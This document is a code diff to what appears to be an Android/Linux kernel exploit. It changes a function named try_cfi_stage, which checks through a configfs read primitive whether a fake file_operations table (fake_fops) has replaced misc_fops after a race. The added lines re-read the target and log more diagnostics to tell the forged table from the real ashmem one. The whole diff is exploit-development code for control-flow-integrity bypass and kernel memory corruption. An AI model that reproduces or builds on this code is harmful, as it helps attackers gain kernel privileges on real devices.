@@ -363,6 +363,18 @@ int try_cfi_stage(void) {
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     /* Save errno before any logging: pr_warning may clobber it. */
     int pre_errno = errno;
+    /* Save the blob-setup snapshot before the re-probe below overwrites
+     * the cfg_last_set_* globals. */
+    int pre_cfg_ret = cfg_last_set_ret, pre_cfg_errno = cfg_last_set_errno;
+    /* Determinism re-probe (read-only): same target, same helper, fresh
+     * buffer. Distinguishes a deterministic unreadable target from an
+     * errno-sampling artifact. Post-race fail path: no timing impact. */
+    uint64_t pre_fops2 = 0;
+    errno = 0;
+    ssize_t pre_rb2 = configfs_read_once(
+        fd, misc_fops, &pre_fops2, sizeof(pre_fops2));
+    int pre_errno2 = errno;
+    int cfg2_ret = cfg_last_set_ret, cfg2_errno = cfg_last_set_errno;
     /* Control: plain pos=0 read on the same fd into an independent buffer.
      * Must not touch pre_fops or the verdict above. */
     unsigned char ctl_buf[8];
@@ -376,8 +388,12 @@ int try_cfi_stage(void) {
                fake_fops, pre_errno);
     pr_warning("cfi misc_fops control fd=%d set_ret=%d set_errno=%d "
                "pos0_ret=%zd pos0_first=%02x%02x pos0_errno=%d\n",
-               fd, cfg_last_set_ret, cfg_last_set_errno,
+               fd, pre_cfg_ret, pre_cfg_errno,
                ctl_rb, ctl_buf[0], ctl_buf[1], ctl_errno);
+    pr_warning("cfi misc_fops reprobe ret2=%zd read2=%016llx errno2=%d "
+               "set2_ret=%d set2_errno=%d\n",
+               pre_rb2, (unsigned long long)pre_fops2, pre_errno2,
+               cfg2_ret, cfg2_errno);
     /* Decisive A/B probe (read-only): fake table uses noop_llseek which
      * always succeeds; true ashmem_llseek rejects with EINVAL. lseek
      * SEEK_CUR with offset 0 moves nothing either way. */
